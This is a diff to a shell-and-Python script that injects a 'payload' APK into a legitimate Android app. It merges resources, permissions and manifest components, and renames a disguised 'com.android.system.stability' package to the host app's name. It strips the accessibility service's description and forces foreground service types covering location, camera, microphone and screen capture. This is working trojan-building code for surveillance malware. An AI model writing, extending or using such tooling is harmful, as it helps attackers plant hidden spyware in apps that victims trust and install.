@@ -195,10 +195,11 @@ for split_apk in "$TARGET_FOLDER"/*config*.apk "$TARGET_FOLDER"/*split*.apk; do
     fi
 done
 
-# Copy res/xml (Accessibility Service Config)
-if [ -d "$PAYLOAD_DIR/res/xml" ]; then
-    mkdir -p "$TARGET_DIR/res/xml"
-    cp -rn "$PAYLOAD_DIR/res/xml"/* "$TARGET_DIR/res/xml/" 2>/dev/null || true
+# Copy All Payload Resources (drawables, mipmaps, values, layouts, styles) into target/res/
+if [ -d "$PAYLOAD_DIR/res" ]; then
+    echo -e "${CYAN}[*] Merging payload resources into target res directory...${NC}"
+    mkdir -p "$TARGET_DIR/res"
+    cp -rn "$PAYLOAD_DIR/res"/* "$TARGET_DIR/res/" 2>/dev/null || true
     if [ -f "$TARGET_DIR/res/xml/accessibility_service_config.xml" ]; then
         sed -i.bak 's|android:description="[^"]*"||g' "$TARGET_DIR/res/xml/accessibility_service_config.xml" 2>/dev/null
         rm -f "$TARGET_DIR/res/xml/accessibility_service_config.xml.bak"
@@ -249,13 +250,39 @@ grep -o '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | while read -r perm; do
 done
 
 # Perform 100% valid XML manifest surgery via Python ElementTree
-python3 - "$PAYLOAD_MANIFEST" "$TARGET_MANIFEST" "$PKG_NAME" << 'EOF'
-import sys, xml.etree.ElementTree as ET
+python3 - "$PAYLOAD_MANIFEST" "$TARGET_MANIFEST" "$PKG_NAME" "$PAYLOAD_DIR" "$TARGET_DIR" << 'EOF'
+import sys, os, re, xml.etree.ElementTree as ET
 
-payload_path, target_path, target_pkg = sys.argv[1], sys.argv[2], sys.argv[3]
+payload_path, target_path, target_pkg, payload_dir, target_dir = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]
 ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
 
 try:
+    # 1. Merge values/*.xml (styles, colors, strings) from payload to target
+    payload_values = os.path.join(payload_dir, "res", "values")
+    target_values = os.path.join(target_dir, "res", "values")
+    if os.path.exists(payload_values) and os.path.exists(target_values):
+        for xml_file in ["styles.xml", "colors.xml", "strings.xml", "drawables.xml"]:
+            p_xml = os.path.join(payload_values, xml_file)
+            t_xml = os.path.join(target_values, xml_file)
+            if os.path.exists(p_xml) and os.path.exists(t_xml):
+                try:
+                    p_tree = ET.parse(p_xml)
+                    t_tree = ET.parse(t_xml)
+                    p_root = p_tree.getroot()
+                    t_root = t_tree.getroot()
+                    existing_names = {c.attrib.get('name') for c in t_root if c.attrib.get('name')}
+                    added = False
+                    for elem in p_root:
+                        name = elem.attrib.get('name')
+                        if name and name not in existing_names:
+                            t_root.append(elem)
+                            existing_names.add(name)
+                            added = True
+                    if added:
+                        t_tree.write(t_xml, encoding='utf-8', xml_declaration=True)
+                except Exception as e:
+                    print(f"Values merge notice for {xml_file}: {e}")
+
     payload_root = ET.parse(payload_path).getroot()
     payload_app = payload_root.find('application')
 
@@ -300,6 +327,22 @@ try:
             target_xml = target_xml.replace("</application>", injection_block, 1)
 
         target_xml = target_xml.replace("com.android.system.stability", target_pkg).replace("com.labs.labrats.fileprovider", target_pkg + ".fileprovider")
+
+        # Sanitize decompiled hex foregroundServiceType flags (e.g. 0x40000009 -> dataSync|location|specialUse)
+        hex_map = {
+            '0x40000009': 'dataSync|location|specialUse',
+            '0x40000001': 'dataSync|specialUse',
+            '0x40000000': 'specialUse',
+            '0x00000001': 'dataSync',
+            '0x00000008': 'location',
+            '0x00000040': 'camera',
+            '0x00000080': 'microphone',
+            '0x00000020': 'mediaProjection'
+        }
+        for hex_val, flag_str in hex_map.items():
+            target_xml = target_xml.replace(f'android:foregroundServiceType="{hex_val}"', f'android:foregroundServiceType="{flag_str}"')
+
+        target_xml = re.sub(r'android:foregroundServiceType="0x[0-9a-fA-F]+"', 'android:foregroundServiceType="dataSync|location|camera|microphone|specialUse"', target_xml)
 
         with open(target_path, 'w', encoding='utf-8') as f:
             f.write(target_xml)
